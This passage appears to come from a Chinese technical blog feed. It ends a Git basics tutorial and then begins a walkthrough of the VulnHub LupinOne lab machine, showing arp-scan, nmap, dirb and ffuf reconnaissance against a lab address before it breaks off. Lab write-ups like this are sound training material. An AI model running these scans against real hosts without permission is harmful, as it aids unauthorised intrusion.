-e --global   # 针对系统上所有仓库<br></code></pre></td></tr></table></figure><p>设置提交代码时的用户信息：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230430182841624.png" alt="image-20230430182841624"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">git config --global user.name &quot;弗有冥焉&quot;<br>git config --global user.email fuyoumingyan@gmail.com<br></code></pre></td></tr></table></figure><h3 id="SSH-配置"><a href="#SSH-配置" class="headerlink" title="SSH 配置"></a>SSH 配置</h3><p>gitee、github 都可以使用 ssh 公钥</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230530094043353.png" alt="image-20230530094043353"></p><p>ssh 相对于 https 更加方便，github 也更快。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">cd ~/.ssh<br>ssh-keygen -t rsa -C &quot;xxx@xxx.com&quot;<br>cat id_rsa.pub<br></code></pre></td></tr></table></figure><p>然后在 gitee 或者 github 上面添加 SSH 公钥即可。</p><p>验证：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">ssh</span> -T git<span class="hljs-variable">@github</span>.com<br>ssh -T git<span class="hljs-variable">@gitee</span>.com<br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230530094500633.png" alt="image-20230530094500633"></p><p>如果使用 ssh 的话，仓库的远程地址就是 <code>git@gitee.com:fuyoumingyan/fuyoumingyan.git</code> 这种的 SSH 地址了。</p><h2 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h2><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/git-command.jpg" alt="img"  /><ul><li>workspace：工作区</li><li>staging area：暂存区&#x2F;缓存区</li><li>local repository：版本库或本地仓库</li><li>remote repository：远程仓库</li></ul><p>本地就是工作区，add 到缓存区，提交到本地仓库后，再push到远程仓库，就是推送到到 github，gitee 这种代码托管平台。</p><h3 id="提交到本地仓库"><a href="#提交到本地仓库" class="headerlink" title="提交到本地仓库"></a>提交到本地仓库</h3><table><thead><tr><th align="left">命令</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left"><code>git add</code></td><td align="left">添加文件到暂存区</td></tr><tr><td align="left"><code>git status</code></td><td align="left">查看仓库当前的状态，显示有变更的文件。</td></tr><tr><td align="left"><code>git diff</code></td><td align="left">比较文件的不同，即暂存区和工作区的差异。</td></tr><tr><td align="left"><code>git commit</code></td><td align="left">提交暂存区到本地仓库。</td></tr><tr><td align="left"><code>git reset</code></td><td align="left">回退版本。</td></tr><tr><td align="left"><code>git rm</code></td><td align="left">将文件从暂存区和工作区中删除。</td></tr><tr><td align="left"><code>git mv</code></td><td align="left">移动或重命名工作区文件。</td></tr></tbody></table><blockquote><p>查看仓库当前的状态，显示有变更的文件。</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">git status<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">git status</span><br>On branch master<br>Your branch is up to date with &#x27;origin/master&#x27;.<br><span class="hljs-meta prompt_"># </span><span class="language-bash">未跟踪的文件</span><br>Untracked files:<br>  (use &quot;git add &lt;file&gt;...&quot; to include in what will be committed)<br><span class="hljs-meta prompt_">  # </span><span class="language-bash">8. Corrosion-2/ 文件夹未 add</span><br>        8. Corrosion-2/<br><br>nothing added to commit but untracked files present (use &quot;git add&quot; to track)<br></code></pre></td></tr></table></figure><blockquote><p>add 到暂存区</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">add 所有文件-实际上还是只 add 未跟踪的文件</span><br>git add .<br><span class="hljs-meta prompt_"># </span><span class="language-bash">add 指定文件</span><br>git add &lt;filename&gt;<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs shell">Administrator@DESKTOP-NURJR6J MINGW64 ~/Desktop/笔记/gitee penetration-test 仓库/靶机渗透 (master)<br><span class="hljs-meta prompt_">$ </span><span class="language-bash">git add .</span><br><br>Administrator@DESKTOP-NURJR6J MINGW64 ~/Desktop/笔记/gitee penetration-test 仓库/靶机渗透 (master)<br><span class="hljs-meta prompt_">$ </span><span class="language-bash">git status</span><br>On branch master<br>Your branch is up to date with &#x27;origin/master&#x27;.<br><br>Changes to be committed:<br>  (use &quot;git restore --staged &lt;file&gt;...&quot; to unstage)<br>        new file:   8. Corrosion-2/Corrosion-2.assets/image-20230430104300814.png<br>        new file:   8. Corrosion-2/Corrosion-2.assets/image-20230430105426167.png<br>        new file:   8. Corrosion-2/Corrosion-2.assets/image-20230430110927971.png<br>        new file:   8. Corrosion-2/Corrosion-2.assets/image-20230430111001206.png<br>        new file:   8. Corrosion-2/Corrosion-2.assets/image-20230430163907626.png<br>        new file:   8. Corrosion-2/Corrosion-2.md<br></code></pre></td></tr></table></figure><blockquote><p>commit 到本地仓库</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">git commit -m &#x27;注释内容&#x27;<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">git commit -m <span class="hljs-string">&#x27;2023-04-30&#x27;</span></span><br>[master 13108bc] 2023-04-30<br> 6 files changed, 814 insertions(+)<br> create mode 100644 &quot;\351\235\266\346\234\272\346\270\227\351\200\217/8. Corrosion-2/Corrosion-2.assets/image-20230430104300814.png&quot;<br> create mode 100644 &quot;\351\235\266\346\234\272\346\270\227\351\200\217/8. Corrosion-2/Corrosion-2.assets/image-20230430105426167.png&quot;<br> create mode 100644 &quot;\351\235\266\346\234\272\346\270\227\351\200\217/8. Corrosion-2/Corrosion-2.assets/image-20230430110927971.png&quot;<br> create mode 100644 &quot;\351\235\266\346\234\272\346\270\227\351\200\217/8. Corrosion-2/Corrosion-2.assets/image-20230430111001206.png&quot;<br> create mode 100644 &quot;\351\235\266\346\234\272\346\270\227\351\200\217/8. Corrosion-2/Corrosion-2.assets/image-20230430163907626.png&quot;<br> create mode 100644 &quot;\351\235\266\346\234\272\346\270\227\351\200\217/8. Corrosion-2/Corrosion-2.md&quot;<br></code></pre></td></tr></table></figure><h3 id="提交到远程仓库"><a href="#提交到远程仓库" class="headerlink" title="提交到远程仓库"></a>提交到远程仓库</h3><table><thead><tr><th align="left">命令</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left"><code>git remote</code></td><td align="left">远程仓库操作</td></tr><tr><td align="left"><code>git fetch</code></td><td align="left">从远程获取代码库</td></tr><tr><td align="left"><code>git pull</code></td><td align="left">下载远程代码并合并</td></tr><tr><td align="left"><code>git push</code></td><td align="left">上传远程代码并合并</td></tr></tbody></table><blockquote><p>添加远程仓库 git remote</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">git remote add -h</span><br>usage: git remote add [&lt;options&gt;] &lt;name&gt; &lt;url&gt;仓库名 仓库链接<br><br>    -f, --fetch           fetch the remote branches<br>    --tags                import all tags and associated objects when fetching<br>                          or do not fetch any tag at all (--no-tags)<br>    -t, --track &lt;branch&gt;  branch(es) to track<br>    -m, --master &lt;branch&gt;<br>                          master branch<br>    --mirror[=(push|fetch)]<br>                          set up remote as a mirror to push to or fetch from<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">git remote add gitee https://gitee.com/fuyoumingyan/penetration-test.git</span><br></code></pre></td></tr></table></figure><blockquote><p>查看远程仓库信息 git remote -v</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">git remote -v</span><br>gitee   https://gitee.com/fuyoumingyan/penetration-test.git (fetch)<br>gitee   https://gitee.com/fuyoumingyan/penetration-test.git (push)<br></code></pre></td></tr></table></figure><blockquote><p>推送到远程仓库 git push</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">git push -u 仓库名 分支<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">git push -u gitee <span class="hljs-string">&quot;master&quot;</span></span><br>Enumerating objects: 13, done.<br>Counting objects: 100% (13/13), done.<br>Delta compression using up to 4 threads<br>Compressing objects: 100% (11/11), done.<br>Writing objects: 100% (11/11), 189.99 KiB | 12.67 MiB/s, done.<br>Total 11 (delta 2), reused 0 (delta 0), pack-reused 0<br>remote: Powered by GITEE.COM [GNK-6.4]<br>To https://gitee.com/fuyoumingyan/penetration-test.git<br>   0b32d77..13108bc  master -&gt; master<br>branch &#x27;master&#x27; set up to track &#x27;gitee/master&#x27;.<br></code></pre></td></tr></table></figure><h3 id="提交日志"><a href="#提交日志" class="headerlink" title="提交日志"></a>提交日志</h3><table><thead><tr><th align="left">命令</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left"><code>git log</code></td><td align="left">查看历史提交记录</td></tr><tr><td align="left"><code>git blame &lt;file&gt;</code></td><td align="left">以列表形式查看指定文件的历史修改记录</td></tr></tbody></table><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">git <span class="hljs-built_in">log</span></span><br>commit 13108bc60914d4cf27e2b34c474f918eb00648a2 (HEAD -&gt; master)<br>Author: 弗有冥焉 &lt;fuyoumingyan@gmail.com&gt;<br>Date:   Sun Apr 30 18:41:28 2023 +0800<br><br>    2023-04-30<br><br>commit 0b32d77c5862b75b4d3ff179f6ed06801332237a (origin/master)<br>Author: 弗有冥焉 &lt;fuyoumingyan@gmail.com&gt;<br>Date:   Sat Apr 29 20:44:00 2023 +0800<br><br>    2023-04-29<br><br>commit 151dcd1252b948e2b060cbcd784ef706f9f5e7a0<br>Author: 弗有冥焉 &lt;fuyoumingyan@gmail.com&gt;<br>Date:   Fri Apr 28 16:20:39 2023 +0800<br><br>    2023-04-28<br><br>commit 28dc9e44df152a057d4deb1755a99237efd4d0f2<br>Author: 弗有冥焉 &lt;fuyoumingyan@gmail.com&gt;<br>Date:   Fri Apr 28 16:11:43 2023 +0800<br><br>    2023-04-28<br><br></code></pre></td></tr></table></figure><h2 id="忽略文件"><a href="#忽略文件" class="headerlink" title="忽略文件"></a>忽略文件</h2><blockquote><p><code>.gitignore</code>  文件用来指定有意忽略的未跟踪文件，就是不需要提交到仓库的一些文件</p></blockquote><p>gitignore 语法：</p><ul><li><code>#</code>  用于注释，<code>\</code> 表示转义，引用 <code>\</code> 需要加引号 <code>&quot;\&quot;</code></li><li><code>*</code> 任意字符 0 次或多次，<code>?</code> 任意字符 1 次 ，都不可以匹配 <code>/</code></li><li><code>/</code> 在开头表示从 <code>.gitignore</code> 文件所在的目录开始匹配</li><li><code>/</code> 在末尾表示只匹配目录，否则同名的目录或文件都会被匹配</li><li><code>!</code> 表示不忽略某文件，但如果该文件的父级目录被忽略，则不起效果</li><li><code>[]</code> 匹配字符列表 </li><li><code>**</code> 匹配多级目录</li></ul><h2 id="恢复文件"><a href="#恢复文件" class="headerlink" title="恢复文件"></a>恢复文件</h2><blockquote><p>没有 add 的文件恢复 - 工作区</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">git checkout &lt;file&gt;<br></code></pre></td></tr></table></figure><blockquote><p>add 过但没有 commit - 暂存区</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">git checkout &lt;commit_id&gt; &lt;file&gt;<br></code></pre></td></tr></table></figure><blockquote><p>commit 后恢复到以前的版本 - 本地仓库</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">git checkout &lt;commit_id&gt; <br></code></pre></td></tr></table></figure><h2 id="分支管理"><a href="#分支管理" class="headerlink" title="分支管理"></a>分支管理</h2><p>开发分支 - 负责开发</p><p>主线 - 开发完成后的主要业务线，正常的开发不会影响 - master&#x2F;main</p><p>切换分支的时候，Git 会用该分支的最后提交的快照替换你的工作目录的内容， 所以多个分支不需要多个目录。</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230430204332072.png" alt="image-20230430204332072"></p><h3 id="创建分支"><a href="#创建分支" class="headerlink" title="创建分支"></a>创建分支</h3><blockquote><p>创建仓库时创建分支，默认会创建一个 master 分支</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">git init -b &lt;branchname&gt;<br></code></pre></td></tr></table></figure><blockquote><p>已有仓库</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">git branch &lt;branchname&gt;<br></code></pre></td></tr></table></figure><h3 id="查看分支"><a href="#查看分支" class="headerlink" title="查看分支"></a>查看分支</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">git branch<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">git branch</span><br>  deve<br>* master<br></code></pre></td></tr></table></figure><blockquote><p>注：创建分支失败或查看分支为空的原因是因为本地还没有创建分支，需要 commit 之后才可以</p></blockquote><h3 id="切换分支"><a href="#切换分支" class="headerlink" title="切换分支"></a>切换分支</h3><blockquote><p>切换分支</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">git checkout &lt;branch&gt;<br></code></pre></td></tr></table></figure><blockquote><p>创建分支后直接切换到分支</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">git checkout -b &lt;branchname&gt;<br></code></pre></td></tr></table></figure><h3 id="删除分支"><a href="#删除分支" class="headerlink" title="删除分支"></a>删除分支</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">git branch -d &lt;branchname&gt;<br></code></pre></td></tr></table></figure><h3 id="重命名分支"><a href="#重命名分支" class="headerlink" title="重命名分支"></a>重命名分支</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">git branch -m &lt;old-branch&gt; &lt;new-branch&gt;<br></code></pre></td></tr></table></figure><h3 id="合并分支"><a href="#合并分支" class="headerlink" title="合并分支"></a>合并分支</h3><p>合并的是提交。</p><ol><li>切换到那个需要接收改动的分支上。</li><li>执行 “git merge” 命令，并且在后面加上那个将要合并进来的分支的名称。</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">git merge &lt;被合并的分支&gt;<br></code></pre></td></tr></table></figure><h2 id="报错解决"><a href="#报错解决" class="headerlink" title="报错解决"></a>报错解决</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">1. 先拉下来合并</span><br>git pull origin master<br><span class="hljs-meta prompt_"># </span><span class="language-bash">2. 再上传上去</span><br>git push -u origin master<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>其他</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Empire_lupinone</title>
    <link href="/2023/05/29/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/empire-lupinone/"/>
    <url>/2023/05/29/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/empire-lupinone/</url>
    
    <content type="html"><![CDATA[<h1 id="LupinOne"><a href="#LupinOne" class="headerlink" title="LupinOne"></a>LupinOne</h1><p>靶机地址：<a href="https://www.vulnhub.com/entry/empire-lupinone,750/">https://www.vulnhub.com/entry/empire-lupinone,750/</a></p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/home/kali]<br>└─<span class="hljs-comment"># arp-scan -l</span><br>Interface: eth0, <span class="hljs-built_in">type</span>: EN10MB, MAC: 00:0c:29:99:90:c7, IPv4: 192.168.222.128<br>WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied<br>WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied<br>Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)<br>192.168.222.1   00:50:56:c0:00:08       (Unknown)<br>192.168.222.2   00:50:56:ec:db:c2       (Unknown)<br>192.168.222.131 00:0c:29:94:0f:6c       (Unknown)<br>192.168.222.254 00:50:56:e0:43:d1       (Unknown)<br><br>4 packets received by filter, 0 packets dropped by kernel<br>Ending arp-scan 1.10.0: 256 hosts scanned <span class="hljs-keyword">in</span> 2.015 seconds (127.05 hosts/sec). 4 responded<br></code></pre></td></tr></table></figure><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/home/kali]<br>└─<span class="hljs-comment"># nmap -A -p- -T 5 192.168.222.131</span><br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-15 03:06 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.222.131<br>Host is up (0.00072s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)<br>| ssh-hostkey: <br>|   3072 edead9d3af199c8e4e0f31dbf25d1279 (RSA)<br>|   256 bf9fa993c58721a36b6f9ee68761f519 (ECDSA)<br>|_  256 ac18eccc35c051f56f4774c30195b40f (ED25519)<br>80/tcp open  http    Apache httpd 2.4.48 ((Debian))<br>|_http-title: Site doesn<span class="hljs-string">&#x27;t have a title (text/html).</span><br><span class="hljs-string">| http-robots.txt: 1 disallowed entry </span><br><span class="hljs-string">|_/~myfiles</span><br><span class="hljs-string">|_http-server-header: Apache/2.4.48 (Debian)</span><br><span class="hljs-string">MAC Address: 00:0C:29:94:0F:6C (VMware)</span><br><span class="hljs-string">Device type: general purpose</span><br><span class="hljs-string">Running: Linux 4.X|5.X</span><br><span class="hljs-string">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span><br><span class="hljs-string">OS details: Linux 4.15 - 5.6</span><br><span class="hljs-string">Network Distance: 1 hop</span><br><span class="hljs-string">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="hljs-string"></span><br><span class="hljs-string">TRACEROUTE</span><br><span class="hljs-string">HOP RTT     ADDRESS</span><br><span class="hljs-string">1   0.72 ms 192.168.222.131</span><br><span class="hljs-string"></span><br><span class="hljs-string">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 13.30 seconds                                                                                                   </span><br></code></pre></td></tr></table></figure><p>SSH 、HTTP</p><p>robots.txt -&gt; &#x2F;~myfiles</p><p><a href="http://192.168.222.131/~myfiles/">http://192.168.222.131/~myfiles/</a></p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230415151014511.png" alt="image-20230415151014511"></p><p><a href="http://192.168.222.131/">http://192.168.222.131/</a>~ 可以尝试进行目录爆破</p><h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/home/kali]<br>└─<span class="hljs-comment"># dirb http://192.168.222.131/</span><br><br>-----------------<br>DIRB v2.22    <br>By The Dark Raver<br>-----------------<br><br>START_TIME: Sat Apr 15 03:07:57 2023<br>URL_BASE: http://192.168.222.131/<br>WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt<br><br>-----------------<br><br>GENERATED WORDS: 4612                                                          <br><br>---- Scanning URL: http://192.168.222.131/ ----<br>==&gt; DIRECTORY: http://192.168.222.131/image/                                                                                                                   <br>+ http://192.168.222.131/index.html (CODE:200|SIZE:333)                                                                                                        <br>==&gt; DIRECTORY: http://192.168.222.131/javascript/                                                                                                              <br>==&gt; DIRECTORY: http://192.168.222.131/manual/                                                                                                                  <br>+ http://192.168.222.131/robots.txt (CODE:200|SIZE:34)                                                                                                         <br>+ http://192.168.222.131/server-status (CODE:403|SIZE:280)                                                                                                     <br>                                                                                                                                                               <br>---- Entering directory: http://192.168.222.131/image/ ----<br>(!) WARNING: Directory IS LISTABLE. No need to scan it.                        <br>    (Use mode <span class="hljs-string">&#x27;-w&#x27;</span> <span class="hljs-keyword">if</span> you want to scan it anyway)<br>                                                                                                                                                               <br>---- Entering directory: http://192.168.222.131/javascript/ ----<br>==&gt; DIRECTORY: http://192.168.222.131/javascript/jquery/                                                                                                       <br>                                                                                                                                                               <br>---- Entering directory: http://192.168.222.131/manual/ ----<br>==&gt; DIRECTORY: http://192.168.222.131/manual/da/                                                                                                               <br>==&gt; DIRECTORY: http://192.168.222.131/manual/de/                                                                                                               <br>==&gt; DIRECTORY: http://192.168.222.131/manual/en/                                                                                                               <br>==&gt; DIRECTORY: http://192.168.222.131/manual/es/                                                                                                               <br>==&gt; DIRECTORY: http://192.168.222.131/manual/fr/                                                                                                               <br>==&gt; DIRECTORY: http://192.168.222.131/manual/images/                                                                                                           <br>+ http://192.168.222.131/manual/index.html (CODE:200|SIZE:676)                                                                                                 <br>==&gt; DIRECTORY: http://192.168.222.131/manual/ja/                                                                                                               <br>==&gt; DIRECTORY: http://192.168.222.131/manual/ko/                                                                                                               <br>==&gt; DIRECTORY: http://192.168.222.131/manual/ru/  <br><br>...<br></code></pre></td></tr></table></figure><h3 id="目录爆破"><a href="#目录爆破" class="headerlink" title="目录爆破"></a>目录爆破</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/usr/share/wordlists]<br>└─<span class="hljs-comment"># ffuf -w /usr/share/dirb/wordlists/common.txt -u http://192.168.222.131/~FUZZ  -c -v       </span><br><br>        /<span class="hljs-string">&#x27;___\  /&#x27;</span>___\           /<span class="hljs-string">&#x27;___\       </span><br><span class="hljs-string">       /\ \__/ /\ \__/  __  __  /\ \__/       </span><br><span class="hljs-string">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      </span><br><span class="hljs-string">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      </span><br><span class="hljs-string">         \ \_\   \ \_\  \ \____/  \ \_\       </span><br><span class="hljs-string">          \/_/    \/_/   \/___/    \/_/       </span><br><span class="hljs-string"></span><br><span class="hljs-string">       v2.0.0-dev</span><br><span class="hljs-string">________________________________________________</span><br><span class="hljs-string"></span><br><span class="hljs-string"> :: Method           : GET</span><br><span class="hljs-string"> :: URL              : http://192.168.222.131/~FUZZ</span><br><span class="hljs-string"> :: Wordlist         : FUZZ: /usr/share/dirb/wordlists/common.txt</span><br><span class="hljs-string"> :: Follow redirects : false</span><br><span class="hljs-string"> :: Calibration      : false</span><br><span class="hljs-string"> :: Timeout          : 10</span><br><span class="hljs-string"> :: Threads          : 40</span><br><span class="hljs-string"> :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500</span><br><span class="hljs-string">________________________________________________</span><br><span class="hljs-string"></span><br><span class="hljs-string">[Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 5ms]</span><br><span class="hljs-string">| URL | 